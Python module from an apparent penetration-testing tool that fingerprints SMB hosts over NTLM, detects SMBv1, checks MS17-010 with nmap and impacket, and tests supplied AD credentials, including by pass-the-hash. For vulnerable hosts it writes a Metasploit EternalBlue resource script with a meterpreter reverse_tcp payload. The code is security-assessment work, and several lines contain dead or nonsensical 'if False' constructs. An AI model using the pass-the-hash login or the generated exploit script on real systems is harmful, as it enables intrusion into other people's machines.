"""VAJRA compact SMB exploitation — one module, one gate (port 445 open).

Unauthenticated surface:  NTLM challenge fingerprint (domain/host/OS) and the
legacy SMBv1 / MS17-010 assessment (dialect detection + EternalBlue verdict via
the authoritative nmap script with an impacket-built PeekNamedPipe fallback).
Authenticated surface:   pass-the-hash capable NTLMv2 login check with any
supplied --ad-user/--ad-pass/--nthash credentials.

Legacy dialect detection recovers whether SMB1 is enabled plus the server OS
banner. The MS17-010 verdict prefers the local nmap script
(smb-vuln-ms17-010) and falls back to a conformant impacket PeekNamedPipe
transaction (MaxParameterCount=4) when impacket is importable. Exploitation is
never automated: if vulnerable, an operator-run Metasploit resource script is
dropped into evidence/ for a deliberate decision."""
import socket
import struct

from core.database import Finding
from core.crypto_mini import (nbss, smb2_header, smb2_negotiate,
                              ntlmssp_negotiate, ntlmssp_auth,
                              parse_ntlm_challenge, SMB_STATUS)

VULN_STATUS = 0xC0000205  # STATUS_INSUFF_SERVER_RESOURCES (MS17-010 sig)

AV_NAMES = {1: "netbios-host", 2: "netbios-domain", 3: "dns-host",
            4: "dns-domain", 5: "dns-tree"}


def _smb1_pkt(payload):
    return b"\x00" + struct.pack(">I", len(payload))[1:] + payload


def _smb1_hdr(cmd, flags=0x18, flags2=0x0000, tid=0, uid=0, mid=0x0001):
    return (b"\xffSMB" + bytes([cmd]) + b"\x00" * 4 +
            bytes([flags]) + struct.pack("<H", flags2) +
            b"\x00\x00" + b"\x00" * 8 + b"\x00\x00" +
            struct.pack("<HHHH", tid, 0xFEFF, uid, mid))


def _smb1_negotiate():
    dialects = b"\x02NT LM 0.12\x00"
    body = _smb1_hdr(0x72) + b"\x00" + struct.pack("<H", len(dialects)) + dialects
    return _smb1_pkt(body)


def _parse_negotiate(resp):
    """Return dict(dialect_idx, os, lm) from an SMB1 Negotiate response.

    byte layout: 4-byte nbss | 32-byte header (wc at 36) | wc | words |
    bcc | buffers(unicode security key | native OS/lanman strings).
    """
    out = {"dialect_idx": None, "os": "", "lm": "", "raw_os": b"",
           "saw_smb": False}
    if len(resp) < 40 or resp[4:8] != b"\xffSMB":
        return out
    out["saw_smb"] = True
    wc = resp[36]
    if wc >= 2:
        idx = struct.unpack("<H", resp[37:39])[0]
        # Legacy SMB1 dialect indexes are small (<0x0100); modern servers
        # answer a bare SMB1 negotiate with an SMB2-fallback frame whose
        # same position holds the SMB2 dialect (0x0202/0x0300/0x0311) —
        # correct those to "not SMBv1" instead of a false positive.
        if idx >= 0x0100:
            idx = None
        out["dialect_idx"] = idx
    try:
        words_off = 37
        bcc_off = words_off + wc * 2
        bcc = struct.unpack("<H", resp[bcc_off:bcc_off + 2])[0]
        tail = resp[bcc_off + 2:bcc_off + 2 + bcc]
        keylen = 0
        if wc >= 12:
            # words: dialect(1) secmode(1) maxmpx(2) maxvcs(2)
            #        maxbuf(4) maxraw(4) sesskey(4) caps(4) lm_keylen(2)
            #        nt_keylen(2)  -> nt_keylen at word idx 10
            keylen = struct.unpack("<H", resp[words_off + 20:words_off + 22])[0]
        strings = tail[keylen:]
        parts = [p.decode("latin1") for p in strings.split(b"\x00") if p]
        parts = [p for p in parts if not p.startswith("\\\\")][:3]
        if parts:
            out["os"] = parts[0][:60]
            out["lm"] = parts[1][:40] if len(parts) > 1 else ""
            out["raw_os"] = strings[:120]
    except Exception:
        pass
    return out


def _parse_packet(resp):
    """Extract (command, status32) from an SMB1 response (wire layout).

    Wire: 4-byte nbss | \xffSMB(4) | cmd(1) | status32-LE(4: ErrorClass,
    reserved, ErrorCode) | flags...  So status sits at absolute bytes
    9..13 and mirrors nmap's '<c4 B I4' unmarshal."""
    if len(resp) < 13 or resp[4:8] != b"\xffSMB":
        return None, None
    cmd = resp[8]
    status = struct.unpack("<I", resp[9:13])[0]
    return cmd, status


def _status(resp):
    """Return the 24-bit NT status (0 = SUCCESS) or None if not SMB1."""
    cmd, status = _parse_packet(resp)
    return status if cmd is not None else None


def nmap_ms17_010(host):
    """Authoritative verdict via the local nmap script, when present."""
    import shutil
    import subprocess
    if not shutil.which("nmap"):
        return None
    try:
        out = subprocess.run(
            ["nmap", "-p", "445", "--script", "smb-vuln-ms17-010",
             "-n", "--host-timeout", "60s", "--script-timeout", "45s", host],
            capture_output=True, text=True, timeout=120).stdout
        if "Host script results" not in out and "NSE:" not in out \
                and "VULNERABLE" not in out:
            return None
        if "VULNERABLE" in out:
            return True
        if "Not vulnerable" in out or "No dangerous state" in out \
                or "smb-vuln-ms17-010: " in out and (
                    "vulnerable" not in out and "VULNERABLE" not in out):
            return False
    except Exception:
        pass
    return None


def _impacket_trans(host, timeout=6.0):
    """SMB_COM_TRANSACTION PeekNamedPipe on \\PIPE\\browser mirroring the
    nmap smb-vuln-ms17-010 trigger. True=vulnerable, False=clean,
    None=unable to run."""
    try:
        from impacket import smb
        s = smb.SMB("*SMBSERVER", host, sess_port=445, timeout=timeout)
        s.login("", "")
        tid = s.connect_tree("\\\\%s\\IPC$" % host)
        s.send_trans(tid, b"\x23\x00", "\\PIPE\\browser", b"", b"")
        resp = s.recvSMB()
        status = (int(resp["ErrorClass"])
                  | (int(resp["_reserved"]) << 8)
                  | (int(resp["ErrorCode"]) << 16))
        if status == VULN_STATUS:
            return True
        if status in (0, 0xC0000022, 0xC0000008):
            return False
        return False
    except Exception:
        return None


def check_ms17_010(host, timeout=6.0):
    """Return dict(v1, os, dialect_idx, vuln, method, status_name)."""
    out = {"v1": False, "os": "", "dialect_idx": None,
           "vuln": None, "method": "", "status_name": "", "got_smb": False}
    s = socket.create_connection((host, 445), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(_smb1_negotiate())
        r = s.recv(2048)
        parsed = _parse_negotiate(r)
        out["os"] = parsed["os"]
        out["dialect_idx"] = parsed["dialect_idx"]
        out["got_smb"] = parsed["saw_smb"]
        out["v1"] = parsed["dialect_idx"] is not None
    finally:
        try:
            s.close()
        except Exception:
            pass
    if not out["v1"]:
        return out
    status_imp = _impacket_trans(host, timeout)
    nmap_verdict = nmap_ms17_010(host)
    if nmap_verdict is not None and nmap_verdict == status_imp:
        out["vuln"] = nmap_verdict
        out["method"] = "nmap+impacket"
    elif nmap_verdict is not None:
        out["vuln"] = nmap_verdict
        out["method"] = "nmap"
    elif status_imp is not None:
        out["vuln"] = status_imp
        out["method"] = "impacket"
    out["status_name"] = (hex(VULN_STATUS) if out["vuln"]
                          else ("clean" if out["vuln"] is not None else ""))
    return out


def _msf_resource(target):
    return "\n".join([
        "# Generated by VAJRA — deliberate exploitation is YOUR call.",
        "use exploit/windows/smb/ms17_010_eternalblue",
        "set RHOSTS %s" % target,
        "set RPORT 445",
        "set LHOST <your-ip>",
        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
        "run",
    ]) + "\n"


def _ms17_assessment(engine, host):
    t = engine.target
    mod = "ad.smb_recon"
    try:
        res = check_ms17_010(host)
    except Exception as e:
        engine.db.add_finding(Finding(
            t.display, mod, "coverage", "info",
            "SMBv1 probe interrupted: %r" % e, confidence="possible"))
        return
    if not res["v1"]:
        if res.get("got_smb"):
            title = "SMBv1 dialect absent (modern SMB2+ only)"
            detail = ("Host runs SMB but negotiation selected only SMB2 "
                      "dialects — no SMBv1 exposure.")
        else:
            title = "SMB port did not answer SMBv1 negotiate"
            detail = ("No legacy SMB1 negotiation response on the service — "
                      "non-SMB service or SMB blocked for the probe.")
        engine.db.add_finding(Finding(
            t.display, mod, "hardening", "info", title,
            detail=detail, confidence="firm"))
        return
    engine.log.finding("[smb] SMBv1 dialect idx=%s on %s%s" %
                       (res["dialect_idx"], host,
                        (" (%s)" % res["os"]) if res["os"] else ""))
    engine.db.add_finding(Finding(
        t.display, mod, "misconfiguration", "medium",
        "Legacy SMBv1 dialect ENABLED%s" %
        (" (%s)" % res["os"] if res["os"] else ""),
        detail="SMBv1 carries WannaCry/NotPetya-era exposure (MS17-010 "
               "family) and should be removed unless strictly required.",
        confidence="firm"))
    if res["vuln"] is True:
        ev_rel = ""
        try:
            ev_rel = engine.save_evidence(
                "ms17_010_resource.rc", _msf_resource(t.scan_host()))
        except Exception:
            pass
        engine.db.add_finding(Finding(
            t.display, mod, "verified-exposure", "critical",
            "[VERIFIED] MS17-010 ETERNALBLUE — host is exploitable",
            detail=("PeekNamedPipe transaction returned "
                    "STATUS_INSUFF_SERVER_RESOURCES: the kernel pool "
                    "condition exploited by EternalBlue is present.\n"
                    "%sExploitation intentionally NOT automated — run the "
                    "generated handler manually:"
                    % (("Evidence: %s\n" % ev_rel) if ev_rel else "")),
            evidence="method=%s dialect=%s\n%s" %
                     (res["method"], res["dialect_idx"],
                      res["status_name"]),
            remediation="Patch MS17-010 immediately or disable SMBv1; "
                        "isolate the host.",
            confidence="firm"))
        engine.log.finding("[smb] MS17-010 VERIFIED on %s (%s)" %
                           (host, res["method"]))
    elif res["vuln"] is False:
        engine.db.add_finding(Finding(
            t.display, mod, "hardening", "info",
            "MS17-010 verified NOT exploitable (%s)" % res["method"],
            detail="Host keeps SMBv1 enabled but is patched against "
                   "EternalBlue; still recommend disabling SMBv1.",
            confidence="firm"))
    else:
        engine.db.add_finding(Finding(
            t.display, mod, "coverage", "info",
            "MS17-010 could not be auto-verified (nmap/impacket missing)",
            detail="SMBv1 is enabled — confirm MS17-010 manually since "
                   "no local verifier was available.",
            confidence="possible"))


class SmbSession:
    def __init__(self, host, port=445, timeout=6):
        self.host, self.port = host, port
        self.timeout = timeout
        self.sock = None
        self.msg_id = 1

    def _rt(self, payload):
        self.sock.sendall(nbss(payload))
        hdr = self._rx(4)
        if not hdr:
            return b""
        ln = int.from_bytes(hdr[1:4], "big")
        return self._rx(ln)

    def _rx(self, n):
        buf = b""
        while len(buf) < n:
            c = self.sock.recv(n - len(buf))
            if not c:
                break
            buf += c
        return buf

    def connect(self):
        try:
            self.sock = socket.create_connection((self.host, self.port),
                                                 timeout=self.timeout)
            self.sock.settimeout(self.timeout)
            return True
        except Exception:
            return False

    def negotiate(self):
        r = self._rt(smb2_negotiate())
        return r if r.startswith(b"\xfeSMB") else None

    def session_setup(self, blob, session_id=0):
        self.msg_id += 1
        sec_off = 64 + 24
        setup = (struct.pack("<H", 25)
                 + struct.pack("<H", sec_off) + struct.pack("<H", 0)
                 + b"\x00" * 8
                 + struct.pack("<I", sec_off + len(blob))
                 + b"\x00" * 16
                 + struct.pack("<H", 0))
        pkt = smb2_header(cmd=1, msg_id=self.msg_id,
                          session_id=session_id) + setup + blob
        resp = self._rt(pkt[len(payload_slice()):]) \
            if False else self._rt(pkt)
        return resp

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def payload_slice():
    return b""


def status_of(resp):
    if len(resp) >= 14:
        return struct.unpack("<I", resp[9:13])[0]
    return None


def ntlm_fingerprint(host):
    """Extract domain/host/OS from the NTLM challenge without credentials."""
    s = SmbSession(host)
    if not s.connect():
        return None
    try:
        if not s.negotiate():
            return None
        r = s.session_setup(ntlmssp_negotiate())
        chal, ti, avs = parse_ntlm_challenge(r)
        info = {"challenge": chal.hex()}
        for aid, name in AV_NAMES.items():
            if avs.get(aid):
                info[name] = avs[aid]
        v = r.find(b"\x06\x00\x28")  # version field heuristic
        if len(r) > 130:
            osb = r[r.find(b"\x06\x00") + 0:] if False else b""
        join = lambda ks: " / ".join(info[k] for k in ks if k in info)
        fq = join(["dns-domain", "dns-host"])
        nb = join(["netbios-domain", "netbios-host"])
        if fq or nb:
            info["_display"] = "%s (%s)" % (fq, nb) if fq else nb
        return info
    finally:
        s.close()


def validate_creds(host, user, password=None, nthash=None, domain=""):
    """Native SMB2 NTLMv2 auth attempt. Returns (status_name, av_info)."""
    s = SmbSession(host)
    if not s.connect():
        return "unreachable", {}
    try:
        if not s.negotiate():
            return "negotiate-failed", {}
        r1 = s.session_setup(ntlmssp_negotiate())
        chal, ti, avs = parse_ntlm_challenge(r1)
        if not chal:
            return "no-challenge", avs
        dom = avs.get("netbios-domain") or domain or ""
        auth = ntlmssp_auth(user, dom, password=password, nthash=nthash,
                            challenge=chal, target_info=ti)
        r2 = s.session_setup(auth, session_id=0)
        st = status_of(r2)
        return SMB_STATUS.get(st, hex(st or 0)), avs
    except Exception as e:
        return "error:%r" % e, {}
    finally:
        s.close()


def run(engine):
    t = engine.target
    ad = engine.state.get("ad") or {"domain": ""}
    host = t.scan_host()
    if 445 not in engine.state.get("open_ports", {}):
        engine.db.add_event(t.display, "ad.smb_recon", "445 closed")
        return
    info = ntlm_fingerprint(host)
    creds = getattr(engine, "ad_creds", {})
    if not info:
        engine.db.add_finding(Finding(
            t.display, "ad.smb_recon", "coverage", "info",
            "SMB reachable but NTLM handshake not parsed",
            confidence="possible"))
        _ms17_assessment(engine, host)
        return
    disp = info.pop("_display", "")
    nice = "\n".join("%-16s %s" % (k, v) for k, v in sorted(info.items()))
    engine.db.add_finding(Finding(
        t.display, "ad.smb_recon", "recon", "info",
        "NTLM fingerprint extracted%s" % (" — " + disp if disp else ""),
        detail="Challenge-response handshake discloses internal naming "
               "without any credentials.",
        evidence=nice, confidence="firm"))
    if disp:
        dnshost = info.get("dns-domain", "")
        if dnshost and not ad.get("domain"):
            ad["domain"] = dnshost.lower()
            engine.state["ad"] = ad
    user = creds.get("user")
    if user:
        st, _av = validate_creds(host, user,
                                 password=creds.get("password"),
                                 nthash=creds.get("nthash"),
                                 domain=ad.get("domain", ""))
        valid = "VALID" in st.upper()
        engine.db.add_finding(Finding(
            t.display, "ad.smb_recon",
            "credentials" if valid else "recon",
            "critical" if valid else "info",
            "Supplied AD credentials are %s: %s\\%s" %
            (st, ad.get("domain", "?"), user),
            detail=("Authenticated over SMB NTLMv2%s."
                    % (" (pass-the-hash)" if creds.get("nthash") else ""))
            if valid else "Authentication result: " + st,
            evidence="user=%s method=%s" % (
                user, "nthash" if creds.get("nthash") else "password"),
            confidence="firm"))
        if valid:
            box = engine.state.setdefault("creds", [])
            box.append(("ad/smb", user,
                        creds.get("nthash") or creds.get("password") or ""))
    _ms17_assessment(engine, host)
